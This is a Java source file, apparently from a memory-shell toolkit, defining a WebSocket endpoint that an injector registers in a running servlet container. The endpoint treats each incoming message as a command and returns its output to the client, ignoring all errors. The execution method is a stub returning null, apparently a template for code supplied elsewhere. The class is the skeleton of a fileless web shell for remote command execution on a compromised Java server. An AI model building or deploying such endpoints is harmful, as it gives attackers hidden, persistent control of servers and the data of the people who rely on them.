package com.reajason.javaweb.memshell.shelltool.command;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import java.io.InputStream;
import java.util.Scanner;

/**
 * JSR-356 Endpoint 版本，由注入器从 ServletContext 取 {@code ServerContainer} 后注册。
 *
 * <a href="https://github.com/veo/wsMemShell">wsMemShell</a>
 *
 * @author ReaJason
 * @since 2024/12/9
 */
public class CommandWebSocket extends Endpoint implements MessageHandler.Whole<String> {

    private Session session;

    @Override
    public void onMessage(String cmd) {
        try {
            InputStream inputStream = getInputStream(getParam(cmd));
            Scanner scanner = new Scanner(inputStream).useDelimiter("\\A");
            session.getBasicRemote().sendText(scanner.hasNext() ? scanner.next() : "");
        } catch (Throwable ignored) {
        }
    }

    @Override
    public void onOpen(final Session session, EndpointConfig config) {
        this.session = session;
        session.addMessageHandler(this);
    }

    private String getParam(String param) {
        return param;
    }

    private InputStream getInputStream(String param) throws Exception {
        return null;
    }
}
